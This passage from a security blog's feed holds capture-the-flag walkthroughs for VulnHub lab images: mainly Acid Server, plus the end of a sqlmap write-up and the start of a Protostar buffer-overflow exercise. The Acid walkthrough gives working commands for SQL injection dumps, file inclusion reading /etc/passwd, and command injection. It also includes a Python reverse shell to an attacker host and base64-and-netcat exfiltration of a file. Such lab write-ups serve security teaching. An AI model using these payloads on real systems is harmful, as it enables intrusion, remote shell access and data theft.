<p>root@kali32:~# sqlmap -u <a href="http://192.168.80.154/checklogin.php">http://192.168.80.154/checklogin.php</a> &ndash;data=&ldquo;myusername=a&amp;mypassword=a&amp;Submit=Login&rdquo; &ndash;os-cmd &lsquo;cat /root/congrats.txt&rsquo; &ndash;batch
&hellip;
[00:13:06] [INFO] the backdoor has been successfully uploaded on &lsquo;/var/www/&rsquo; - <a href="http://192.168.80.154:80/tmpbborl.php">http://192.168.80.154:80/tmpbborl.php</a>
do you want to retrieve the command standard output? [Y/n/a] Y</p>

<h2>command standard output:</h2>

<p>Congratulations!
You&rsquo;ve got root.
&hellip;
{% endcodeblock %}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Acid Server: 1]]></title>
    <link href="http://73696e65.github.io/blog/2015/08/17/acid-server-1/"/>
    <updated>2015-08-17T21:00:53+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/08/17/acid-server-1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/acid-server-1,125/">Acid Server: 1</a></p>

<p>We received the IP address 192.168.80.158 for the vulnerable image. Nmap output for TCP scan:
{% codeblock %}
root@kali32:~# nmap -sT -p- 192.168.80.158 -sV</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-04-29 13:45 CEST
Nmap scan report for 192.168.80.158
Host is up (0.00045s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE VERSION
33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
MAC Address: 00:0C:29:36:7B:18 (VMware)
{% endcodeblock %}</p>

<p>We found the web server. There was a hex value as the last line of the index page:
{% codeblock %}
root@kali32:~# curl <a href="http://192.168.80.158:33447/">http://192.168.80.158:33447/</a>
[ .. snip ..]</p>

<!--0x643239334c6d70775a773d3d-->


<p>{% endcodeblock %}</p>

<p>Converting in python:
{% codeblock %}
root@kali32:~# python</p>

<blockquote><blockquote><blockquote><p>s = &lsquo;643239334c6d70775a773d3d&rsquo;</p>

<p>s.decode(&lsquo;hex&rsquo;)
&lsquo;d293LmpwZw==&rsquo;</p>

<p>import base64</p>

<p>base64.b64decode(s.decode(&lsquo;hex&rsquo;))
&lsquo;wow.jpg&rsquo;
{% endcodeblock %}</p></blockquote></blockquote></blockquote>

<p>We downloaded the <a href="http://192.168.80.158:33447/images/wow.jpg">picture</a> and found another hex string:
{% codeblock %}
root@kali32:~# strings wow.jpg</p>

<p>37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~# python</p>

<blockquote><blockquote><blockquote><p>import re
s = &lsquo;37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34&rsquo;</p>

<p>re.sub(&lsquo;:&rsquo;, &lsquo;&rsquo;, s).decode(&lsquo;hex&rsquo;)
&lsquo;7aee0f6d588ed9905ee37f16a7c610d4&rsquo;
{% endcodeblock %}</p></blockquote></blockquote></blockquote>

<p>Googling this MD5 hash, we found out that it represents the value <code>63425</code>:
{% codeblock %}
root@kali32:~# echo -n 63425 | md5sum
7aee0f6d588ed9905ee37f16a7c610d4  -
{% endcodeblock %}</p>

<p>After a few minutes of waiting, the UDP scan finished, but we found only NTP server listening:
{% codeblock %}
root@kali32:~# nmap 192.168.80.158 -sU
&hellip;
PORT    STATE SERVICE
123/udp open  ntp
{% endcodeblock %}</p>

<p>Reading the page title (or dirb tool) reveals an interesting URL: <a href="http://192.168.80.158:33447/Challenge/">http://192.168.80.158:33447/Challenge/</a></p>

<p>{% codeblock %}
root@kali32:~# curl -s <a href="http://192.168.80.158:33447/Challenge/index.php">http://192.168.80.158:33447/Challenge/index.php</a> | head -1
&lt;!DOCTYPE gkg.qvpn html>
&hellip;</p>

<blockquote><blockquote><blockquote><p>codecs.encode(&lsquo;gkg.qvpn&rsquo;, &lsquo;rot13&rsquo;)
&lsquo;txt.dica&rsquo;</p></blockquote></blockquote></blockquote>

<p>root@kali32:~# curl -s <a href="http://192.168.80.158:33447/Challenge/acid.txt">http://192.168.80.158:33447/Challenge/acid.txt</a>
/protected_page.php
{% endcodeblock %}</p>

<p>We had no further access for <code>/protected_page.php</code>, but the first idea that we had was a referrer check. After verifying by spoofing this value:</p>

<p>{% codeblock lang:html %}
GET /Challenge/protected_page.php HTTP/1.1
Host: 192.168.80.158:33447
Referer: <a href="http://192.168.80.158:33447/Challenge/includes/process_login.php">http://192.168.80.158:33447/Challenge/includes/process_login.php</a>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: sec_session_id=a2gico0b4hgkd0e2av9k3qh8m0
Connection: keep-alive</p>

<p>..</p>

<p>&lt;!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <link rel="stylesheet" href="css/style.css">
        <link rel="stylesheet" href="styles/main.css" />
        <title>Secure Login: Protected Page</title>
    </head>
    <body>
         <div class="wrapper">
                <div class="container"></p>

<pre><code>                                            &lt;p&gt; &lt;h1&gt;Congrats..! You have bypassed User Panel Successfully.&lt;/h1&gt; &lt;br&gt;
                    &lt;p&gt;&lt;h3&gt;There is long way to go :-) &lt;a href="hacked.php"&gt;Click Here to Proceed Further&lt;/a&gt;.&lt;/h3&gt;&lt;/p&gt;

                    &lt;p&gt;&lt;h3&gt;If you are done, please &lt;a href="includes/logout.php"&gt;log out&lt;/a&gt;.&lt;/h3&gt;&lt;/p&gt;

                        &lt;/body&gt;
</code></pre>

<p></html>
..
{% endcodeblock %}</p>

<p>Proceeding further, there are a few hints for sql injection, but nothing that we have tried worked:
<a href="http://192.168.80.158:33447/Challenge/hacked.php?id=33&amp;add=Add+ID">http://192.168.80.158:33447/Challenge/hacked.php?id=33&amp;add=Add+ID</a></p>

<p>Trying sqlmap or manual identification was without success, however Burp
Suite Scanner revealed, that the parameter ID is vulnerable, when it&rsquo;s sent in POST
method:</p>

<p>{% codeblock lang:html %}
POST /Challenge/hacked.php?add=Add_ID HTTP/1.1
Host: 192.168.80.158:33447
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: <a href="http://192.168.80.158:33447/Challenge/hacked.php">http://192.168.80.158:33447/Challenge/hacked.php</a>
Cookie: sec_session_id=1mo7qhj43ul3d90kin24am4531
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 28</p>

<p>id=1&#8217;
&hellip;</p>

<p>Could not enter data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;&#8217;1&rsquo;&lsquo;))&rsquo; at line
{% endcodeblock %}</p>

<p>Now we can use sqlmap and retrieve some useful information:
{% codeblock %}
root@kali32:~# sqlmap -u &ldquo;<a href="http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID">http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID</a>&rdquo; &ndash;cookie=&ldquo;sec_session_id=1mo7qhj43ul3d90kin24am4531&rdquo; -p id &ndash;method=POST &ndash;data=&ldquo;id=1&rdquo; -a
&hellip;</p>

<p>web server operating system: Linux Ubuntu
web application technology: Apache 2.4.10
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL 5.0
banner:    &lsquo;5.6.25-0ubuntu0.15.04.1&rsquo;
current user:    &lsquo;root@localhost&rsquo;
current database:    &lsquo;secure_login&rsquo;
hostname:    &lsquo;acid&rsquo;
current user is DBA:    True</p>

<p>root@kali32:~# sqlmap -u &ldquo;<a href="http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID">http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID</a>&rdquo; &ndash;cookie=&ldquo;sec_session_id=1mo7qhj43ul3d90kin24am4531&rdquo; -p id &ndash;method=POST &ndash;data=&ldquo;id=1&rdquo;  -D secure_login &ndash;tables &ndash;columns &ndash;dump</p>

<p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# cat success.csv
id,VXNlcnMudHh0,Y0dGemN5NTBlSFE9
1,lol,lol1</p>

<p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo VXNlcnMudHh0 | base64 -d
Users.txt</p>

<p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo Y0dGemN5NTBlSFE9 | base64 -d
cGFzcy50eHQ=</p>

<p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo cGFzcy50eHQ= | base64 -d
pass.txt</p>

<p>root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# cat members.csv
id,salt,email,username,password
1,f9aab579fc1b41ed0c44fe4ecdbfcdb4cb99b9023abb241a6db833288f4eea3c02f76e0d35204a8695077dcf81932aa59006423976224be0390395bae152d4ef,test@example.com,test_user,00807432eae173f652f2064bdca1b61b290b52d40e429a7d295d76a71084aa96c0233b82f1feac45529e0726559645acaed6f3ae58a286b9f075916ebf66cacc
2,8a93f1fa3259a90d9cfafcc1ef43dfc2d0a2d6cba0e8f2f9c23ae6b701364aa278bf5629585c3663ae3df5c7a3734ca6af4019d7ef897f45cb0acc056c3e735f,acid@gmail.com,Acid,53b9bd4416ec581838c4bde217e09f1206b94cdb95475cddda862894f4dbbeec5ceacc2e116a64cb56d8384404738c5fd16478e0266962eeb3b61da1918d5931
3,be02c5499ba4fd559dc7809a7fae01d6f251e781dbdf5a7af2c7bca320006f1a5275d8020d5c539d116e54b1bf775018349c721151d9111ad1c3da8f6b9c9697,saman.j.l33t@gmail.com,saman,c124191d7a267cb2b83b2c59a30b2e388b77f13955340015462bffc0d90cfa7b402ecb8e3fc82717f22b127c98a4afa9ed4f3661d824c6c57a1490f9963d9234
4,c72ccb8eb5ac065eca5341ff8ed296648b92bc99b511300a4525e8c17679ecce06e8038e582b539acf17008f9fd3a394d912f1158ef7f3d16d5f66ba32ca18bb,vik.create@gmail.com,Vivek,fb8db054a75254633052d951002065109cd96fe990bf5a5d5bd1581d3578235a69224784b29870046d21d95567cdfe292221fbabce17201b23ca0fd5ee4fa20e
{% endcodeblock %}</p>

<p>Because the hashes are salted SHA512, it was not reasonable to crack them. Instead, using google we found the hashes from test_user <a href="http://www.wikihow.com/Create-a-Secure-Login-Script-in-PHP-and-MySQL">here</a>:</p>

<p>{% codeblock %}
Username: test_user
Email: <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x74;&#x65;&#115;&#116;&#x40;&#x65;&#120;&#97;&#109;&#112;&#108;&#x65;&#46;&#99;&#111;&#109;">&#x74;&#x65;&#x73;&#x74;&#64;&#x65;&#120;&#x61;&#109;&#x70;&#108;&#x65;&#46;&#x63;&#x6f;&#x6d;</a>
Password: 6ZaxN2Vzm9NUJT2y
{% endcodeblock %}</p>

<p>We log in and proceed to the text step:
{% codeblock %}
<a href="http://192.168.80.158:33447/Challenge/">http://192.168.80.158:33447/Challenge/</a>
<a href="http://192.168.80.158:33447/Challenge/include.php">http://192.168.80.158:33447/Challenge/include.php</a>
{% endcodeblock %}</p>

<p>There was <code>&lt;!--0x5933566a4c6e4a34626e413d--&gt;</code> on the page, that means after hex/base64/rot13/reverse <code>cake.php</code>.</p>

<p>We identified LFI:
{% codeblock %}
GET /Challenge/include.php?file=/etc/passwd&amp;add=Extract+File HTTP/1.1
Host: 192.168.80.158:33447
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: <a href="http://192.168.80.158:33447/Challenge/include.php">http://192.168.80.158:33447/Challenge/include.php</a>
Cookie: sec_session_id=f1c3r9m5ud1pdctd6efvgu7ti6
Connection: keep-alive</p>

<p>&hellip;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
<a href="news:x:9:9:news:/var/spool/news:/usr/sbin/nologin">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</a>
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:104:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:105:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:106:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:107:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:110::/home/syslog:/bin/false
messagebus:x:105:112::/var/run/dbus:/bin/false
uuidd:x:106:113::/run/uuidd:/bin/false
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
ntp:x:108:117::/home/ntp:/bin/false
whoopsie:x:109:118::/nonexistent:/bin/false
acid:x:1000:1000:acid,,,:/home/acid:/bin/bash
mysql:x:111:126:MySQL Server,,,:/nonexistent:/bin/false
saman:x:1001:1001:,,,:/home/saman:/bin/bash
{% endcodeblock %}</p>

<p><a href="http://192.168.80.158:33447/Challenge/cake.php">http://192.168.80.158:33447/Challenge/cake.php</a> shows also the <a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/</a> URL.</p>

<p>Dirb found <a href="http://192.168.80.158:33447/Challenge/Magic_Box/proc,">http://192.168.80.158:33447/Challenge/Magic_Box/proc,</a> where we put our next focus.</p>

<p>We wanted to hack the server using <code>/proc/self/environ</code> technique, but the server was a recent ubuntu version and we found only reference to session variable <a href="http://192.168.80.158:33447/Challenge/include.php?file=/proc/self/fd/14&amp;add=Extract+File">file</a>.</p>

<p>{% codeblock %}
<a href="http://192.168.80.158:33447/Challenge/include.php?file=/proc/cmdline&amp;add=Extract+File">http://192.168.80.158:33447/Challenge/include.php?file=/proc/cmdline&amp;add=Extract+File</a>
<a href="http://192.168.80.158:33447/Challenge/include.php?file=/boot/config-3.19.0-15-generic&amp;add=Extract+File">http://192.168.80.158:33447/Challenge/include.php?file=/boot/config-3.19.0-15-generic&amp;add=Extract+File</a>
{% endcodeblock %}</p>

<p>We gave up hacking via /proc, but dirb reveals another files:
{% codeblock %}
root@kali32:~# dirb <a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/</a>  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -X .html,.php,.ini,.txt,.inc,.zip,.bak,.rar,.xml -fw</p>

<hr />

<p>DIRB v2.21</p>

<h2>By The Dark Raver</h2>

<p>START_TIME: Wed Apr 29 18:52:56 2015
URL_BASE: <a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/</a>
WORDLIST_FILES: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
OPTION: Fine tunning of NOT_FOUND detection
OPTION: Not Stoping on warning messages
EXTENSIONS_LIST: (.html,.php,.ini,.txt,.inc,.zip,.bak,.rar,.xml) | (.html)(.php)(.ini)(.txt)(.inc)(.zip)(.bak)(.rar)(.xml) [NUM = 9]</p>

<hr />

<p>GENERATED WORDS: 219174
(!) WARNING: Wordlist is too large. This will take a long time to end.
    (Use mode &lsquo;-w&rsquo; if you want to scan anyway)</p>

<p>&mdash;- Scanning URL: <a href="http://192.168.80.158:33447/Challenge/Magic_Box/">http://192.168.80.158:33447/Challenge/Magic_Box/</a> &mdash;-
+ <a href="http://192.168.80.158:33447/Challenge/Magic_Box/low.php">http://192.168.80.158:33447/Challenge/Magic_Box/low.php</a> (CODE:200|SIZE:0)
+ <a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php</a> (CODE:200|SIZE:54)
+ <a href="http://192.168.80.158:33447/Challenge/Magic_Box/tails.php">http://192.168.80.158:33447/Challenge/Magic_Box/tails.php</a> (CODE:200|SIZE:74)
{% endcodeblock %}</p>

<p>Now we understand from the index page the sentence <code>Fairy tails uses secret keys to open the magical doors.</code></p>

<p>Seems that we almost won, because RCE (OS Commanding) on <a href="http://192.168.80.158:33447/Challenge/Magic_Box/tails.php.">http://192.168.80.158:33447/Challenge/Magic_Box/tails.php.</a></p>

<p>{% codeblock %}
POST /Challenge/Magic_Box/command.php HTTP/1.1
Host: 192.168.80.158:33447
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: <a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php</a>
Cookie: sec_session_id=pieetao0om7q8pop7rgt3i45a2
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 29</p>

<p>IP=127.0.0.1;id&amp;submit=submit</p>

<p>&hellip;</p>

<p>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.017 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.016 ms</p>

<p>&mdash; 127.0.0.1 ping statistics &mdash;
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.013/0.015/0.017/0.003 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endcodeblock %}</p>

<p>We realized after a few seconds, that there is no nc with executable property,
no curl, no wget and no writable place in DocumentRoot on obvious place, we tried
to store something to <code>/var/www/html/</code>. We could send anything over netcat, but
using python reverse shell could be more efficient:</p>

<p>{% codeblock %}
root@kali32:~# nc -l -p 1337</p>

<p>POST /Challenge/Magic_Box/command.php HTTP/1.1
Host: 192.168.80.158:33447
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: <a href="http://192.168.80.158:33447/Challenge/Magic_Box/command.php">http://192.168.80.158:33447/Challenge/Magic_Box/command.php</a>
Cookie: sec_session_id=pieetao0om7q8pop7rgt3i45a2
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 101</p>

<p>IP=x ;python -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;192.168.80.137&rdquo;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;&amp;submit=submit
{% endcodeblock %}</p>

<p>We are connected and now we need to escalate our privileges. We found:
{% codeblock %}
$ cat psl-config.php
&lt;?php
define(&ldquo;HOST&rdquo;, &ldquo;localhost&rdquo;);                    // The host you want to connect to.
define(&ldquo;USER&rdquo;, &ldquo;root&rdquo;);                         // The database username.
define(&ldquo;PASSWORD&rdquo;, &ldquo;mehak&rdquo;);    // The database password.
define(&ldquo;DATABASE&rdquo;, &ldquo;secure_login&rdquo;);             // The database name.</p>

<p>www-data@acid:/$ find / -user acid 2>/dev/null
/sbin/raw_vs_isi/hint.pcapng
/bin/pwn_me
/bin/pwn_me/chkrootkit.lsm
/bin/pwn_me/chkrootkit
/bin/pwn_me/README.chkwtmp
/bin/pwn_me/ACKNOWLEDGMENTS
/bin/pwn_me/chkdirs.c
/bin/pwn_me/ifpromisc.c
/bin/pwn_me/Makefile
/bin/pwn_me/chklastlog.c
/bin/pwn_me/strings.c
/bin/pwn_me/chkwtmp.c
/bin/pwn_me/README.chklastlog
/bin/pwn_me/COPYRIGHT
/bin/pwn_me/chkproc.c
/bin/pwn_me/README
/bin/pwn_me/chkutmp.c
/bin/pwn_me/check_wtmpx.c
/var/lib/lightdm-data/acid
/var/www/html/Challenge/less
/var/www/html/Challenge/less/style.less
/var/www/html/Challenge/css
/var/www/html/Challenge/css/style.css
/var/www/html/Challenge/css/style.css.save
/var/www/html/index.html
/var/www/html/images
/var/www/html/images/bg.jpg
/var/www/html/images/Thumbs.db
/var/www/html/images/wow.jpg
/var/www/html/css
/var/www/html/css/style.css
/home/acid
/home/acid/.xsession-errors.old
/home/acid/Public
/home/acid/.thumbnails
/home/acid/Desktop
/home/acid/.mozilla
/home/acid/.gconf
/home/acid/Videos
/home/acid/Templates
/home/acid/.config
/home/acid/Music
/home/acid/.profile
/home/acid/.bashrc
/home/acid/.sudo_as_admin_successful
/home/acid/Downloads
/home/acid/.xsession-errors
/home/acid/.dmrc
/home/acid/.Xauthority
/home/acid/.local
/home/acid/.local/share
/home/acid/.xscreensaver
/home/acid/.bash_history
/home/acid/.bash_logout
{% endcodeblock %}</p>

<p>The first file was suspicious, after copying to our server and simple analysis we found the following:
{% codeblock %}
root@kali32:~# nc -l -p 1399 > dump</p>

<p>www-data@acid:/$ base64 /sbin/raw_vs_isi/hint.pcapng | nc 192.168.80.137 1399</p>

<p>root@kali32:~# base64 -d dump > capfile</p>

<p>root@kali32:/var/www# tcpick -C -yU -r capfile | less -R
&hellip;
What was the name of the Culprit ???
saman and now a days he&rsquo;s known by the alias of 1337hax0r
oh&hellip;Fuck&hellip;.Great&hellip;Now, we gonna Catch Him Soon :D
&hellip;
{% endcodeblock %}</p>

<p>Finally, we use the string <code>1337hax0r</code> as password:
{% codeblock %}
www-data@acid:/home/acid$ su saman</p>

<p>Password: 1337hax0r</p>

<p>saman@acid:/home/acid$ sudo su</p>

<p>[sudo] password for saman: 1337hax0r</p>

<hr />

<p> / <strong><em>|</em></strong>  _ <strong>   </strong> _ _ <strong> </strong> <em>| |</em> _   <em>| | __ </em>| |<em>(</em>) <em><strong>  _ </strong>  </em><strong>
| |   / _ | &lsquo;<em> \ / </em><code>| '__/ _</code> | </strong>| | | | |/ <em>` | __| |/ _ | &rsquo;</em> \/ <strong>|
| |</strong>| (<em>) | | | | (</em>| | | | (<em>| | |</em>| |<em>| | | (</em>| | |<em>| | (</em>) | | | _<em> \
 _</em><strong>_</strong>/|<em>| |</em>|_<em>, |</em>|  _<em>,</em>|_<em>|_</em>,<em>|</em>|_<em>,</em>|_<em>|</em>|_<strong>/|<em>| |</em>|</strong><em>/
                  |</em>__/</p>

<p>root@acid:~# cat flag.txt</p>

<p>Dear Hax0r,</p>

<p>You have successfully completed the challenge.</p>

<p>I  hope you like it.</p>

<p>FLAG NAME: &ldquo;Acid@Makke@Hax0r&rdquo;</p>

<p>Kind &amp; Best Regards</p>

<p>-ACID
facebook: <a href="https://facebook.com/m.avinash143">https://facebook.com/m.avinash143</a>
{% endcodeblock %}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Final Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/07/06/exploit-exercises-protostar-final-levels/"/>
    <updated>2015-07-06T08:14:11+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/07/06/exploit-exercises-protostar-final-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<p>{% codeblock %}
user@protostar:~$ wget <a href="https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt">https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt</a> &ndash;no-check-certificate -O ~/.gdbinit -q
{% endcodeblock %}</p>

<h2>Protostar Final0</h2>

<p>{% codeblock lang:c final0.c %}</p>

<h1>include &ldquo;../common/common.c&rdquo;</h1>

<h1>define NAME &ldquo;final0&rdquo;</h1>

<h1>define UID 0</h1>

<h1>define GID 0</h1>

<h1>define PORT 2995</h1>

<p>/<em>
 * Read the username in from the network
 </em>/</p>

<p>char <em>get_username()
{
  char buffer[512];
  char </em>q;
  int i;</p>

<p>  memset(buffer, 0, sizeof(buffer));
  gets(buffer);</p>

<p>  /<em> Strip off trailing new line characters </em>/
  q = strchr(buffer, &lsquo;\n&rsquo;);
  if(q) <em>q = 0;
  q = strchr(buffer, &lsquo;\r&rsquo;);
  if(q) </em>q = 0;</p>

<p>  /<em> Convert to lower case </em>/
  for(i = 0; i &lt; strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }</p>

<p>  /<em> Duplicate the string and return it </em>/
  return strdup(buffer);
}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int fd;
  char *username;</p>

<p>  /<em> Run the process as a daemon </em>/
  background_process(NAME, UID, GID);</p>

<p>  /<em> Wait for socket activity and return </em>/
  fd = serve_forever(PORT);</p>

<p>  /<em> Set the client socket to STDIN, STDOUT, and STDERR </em>/
  set_io(fd);</p>

<p>  username = get_username();</p>

<p>  printf(&ldquo;No such user %s\n&rdquo;, username);
}
{% endcodeblock %}</p>

<p>We attach to the process as root to find the offset with stored EIP.</p>

<p>{% codeblock %}</p>

<h1>window1:</h1>

<p>root@protostar:/tmp# gdb -q -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set detach-on-fork off&rsquo; -x /home/user/.gdbinit -p 27474
Attaching to process 27474
&hellip;
gdb> c
[New process 27485]</p>

<h1>window2:</h1>

<p>user@protostar:/tmp$ echo &ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2A&rdquo; | nc 0 2995</p>

<h1>window1:</h1>

<p>Program received signal SIGSEGV, Segmentation fault.
[Switching to process 27485]</p>

<hr />

<pre><code> eax:0804B008 ebx:35724134  ecx:00000000  edx:00000001     eflags:00010286
 esi:00000000 edi:00000000  esp:BFFFF780  ebp:41367241     eip:72413772
 cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a P c 
</code></pre>

<p>[007B:BFFFF780]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
BFFFF7B0 : 01 00 00 00  54 F8 FF BF - 5C F8 FF BF  48 18 FE B7 &hellip;.T&hellip;&#8230;H&hellip;
BFFFF7A0 : B0 98 04 08  00 00 00 00 - 28 F8 FF BF  76 DC EA B7 &hellip;&hellip;..(&hellip;v&hellip;
BFFFF790 : 65 63 EC B7  40 10 FF B7 - 04 00 00 00  F4 7F FD B7 ec..@&hellip;&hellip;&hellip;..
BFFFF780 : 38 41 72 39  41 73 30 41 - 73 31 41 73  32 41 00 BF 8Ar9As0As1As2A..
[007B:0804B008]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
0804B008 : 41 41 30 41  41 31 41 41 - 32 41 41 33  41 41 34 41 AA0AA1AA2AA3AA4A
0804B018 : 41 35 41 41  36 41 41 37 - 41 41 38 41  41 39 41 42 A5AA6AA7AA8AA9AB
[0073:72413772]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
